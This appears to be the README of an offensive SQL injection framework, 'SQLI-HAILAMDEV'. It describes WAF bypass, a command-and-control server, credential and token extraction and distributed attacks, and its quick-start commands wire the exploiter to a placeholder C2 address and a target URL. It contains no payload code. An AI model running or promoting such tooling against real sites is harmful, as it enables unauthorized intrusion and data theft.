# SQLI-HAILAMDEV - SQL Injection Framework

Comprehensive SQL Injection (SQLI) attack framework with C2 coordination, multi-database support, and automated exploitation.

## Architecture

```
SQLI-HAILAMDEV/
├── core/
│   ├── sql_injection_engine.py    # Core SQLI engine (error, union, boolean, time-based, stacked)
│   └── c2_server.py              # Flask C2 server for remote exploitation
├── modules/
│   ├── sql_ioc.py                # IoC (Injection) module for payload generation & execution
│   └── sql_ioc_utils.py          # Helper utilities (database connectors, payload builders)
├── deploy/
│   └── build.py                  # Multi-platform deployment builder
├── config/
│   └── default.json              # Configuration
├── tools/
│   ├── sql_ioc_scanner.py        # Automated vulnerability scanner
│   └── sql_ioc_exploiter.py      # Remote exploitation runner
├── requirements.txt
└── README.md
```

## Features

- **Multi-Database Support**: MySQL, PostgreSQL, MSSQL, Oracle, SQLite
- **Injection Types**: Error-based, Union-based, Boolean-based, Time-based, Stacked
- **WAF Bypass**: Encoding, comment injection, case randomization, noise patterns
- **C2 Integration**: Remote exploitation via centralized C2 server
- **Data Extraction**: Logout tokens, credentials, sensitive data collection
- **Automated Scanning**: Target discovery and vulnerability assessment

## Quick Start

```bash
# Install dependencies
pip install -r requirements.txt

# Start C2 server
python core/c2_server.py --port 9000

# Build deployment packages
python deploy/build.py --platform all --c2 http://C2_IP:9000

# Run scanner
python tools/sql_ioc_scanner.py --targets config/targets.csv

# Execute exploitation
python tools/sql_ioc_exploiter.py --c2 http://C2_IP:9000 --target-url http://target.com
```

## Components

### Core Engine (`sql_injection_engine.py`)
- `SQLIEngine` class with support for all injection types
- Payload generation with WAF bypass techniques
- Result parsing and classification

### C2 Server (`c2_server.py`)
- REST API for remote exploitation control
- Session management and task queuing
- Database-backed persistent storage

### IoC Module (`sql_ioc.py`)
- Payload generators for various injection patterns
- Database connector abstractions
- Output formatting and reporting

### Scanner (`sql_ioc_scanner.py`)
- Target enumeration
- Vulnerability scoring
- Report generation

### Exploiter (`sql_ioc_exploiter.py`)
- Remote command execution
- Data extraction from vulnerable endpoints
- C2 coordination for distributed attacks

## Configuration

Edit `config/default.json` for database connections, C2 settings, and IoC rules.

## Requirements

- Python 3.8+
- Required packages listed in `requirements.txt`
- Database drivers (mysql-connector-python, psycopg2, pymssql, etc.)

## Author

**Author:** Nguyen Xuan Hai

- LinkedIn: [linkedin.com/in/xuanhai0913](https://www.linkedin.com/in/xuanhai0913/)
- Facebook: [facebook.com/nguyenhai0913](https://www.facebook.com/nguyenhai0913)
